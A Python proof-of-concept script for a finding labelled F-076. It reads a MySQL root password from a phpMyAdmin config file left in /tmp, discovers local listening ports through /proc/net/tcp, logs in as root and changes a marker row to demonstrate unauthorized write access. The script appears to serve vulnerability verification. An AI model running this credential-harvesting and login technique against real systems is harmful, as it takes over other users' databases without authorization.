#!/usr/bin/env python3
"""Unprivileged F-076 reader: no owner-supplied config path, port, or secret."""
import json
import re
from pathlib import Path

import pymysql


def listening_ports():
    ports = set()
    for name in ("/proc/net/tcp", "/proc/net/tcp6"):
        try:
            lines = Path(name).read_text().splitlines()[1:]
        except OSError:
            continue
        for line in lines:
            fields = line.split()
            if len(fields) < 4 or fields[3] != "0A":
                continue
            port = int(fields[1].rsplit(":", 1)[1], 16)
            if port >= 1024:
                ports.add(port)
    return sorted(ports)


def main():
    candidates = list(Path("/tmp").glob(
        "f076-natural-*/obj/.aspire/f076mysqlone-config.user.inc.*.php"))
    if len(candidates) != 1:
        print(json.dumps({"candidate_files": len(candidates), "success": False}))
        return 2
    content = candidates[0].read_text(encoding="utf8")
    passwords = re.findall(
        r"\$cfg\['Servers'\]\[\$i\]\['password'\] = '([^']*)';", content)
    if len(passwords) != 2:
        print(json.dumps({"password_count": len(passwords), "success": False}))
        return 3
    ports = listening_ports()
    for port in ports:
        try:
            conn = pymysql.connect(host="127.0.0.1", port=port, user="root",
                password=passwords[0], connect_timeout=1, read_timeout=2,
                write_timeout=2, autocommit=True)
        except (OSError, pymysql.MySQLError):
            continue
        with conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE f076_owned.marker SET status='other' WHERE id=1")
                changed = cur.rowcount
                cur.execute("SELECT CURRENT_USER()")
                principal = cur.fetchone()[0]
        print(json.dumps({"candidate_files": 1, "password_count": 2,
            "listening_ports_considered": len(ports), "discovered_port": port,
            "mysql_principal": principal, "rows_changed": changed,
            "success": changed == 1}, sort_keys=True))
        return 0 if changed == 1 else 4
    print(json.dumps({"candidate_files": 1, "password_count": 2,
        "listening_ports_considered": len(ports), "success": False},
        sort_keys=True))
    return 5


if __name__ == "__main__":
    raise SystemExit(main())
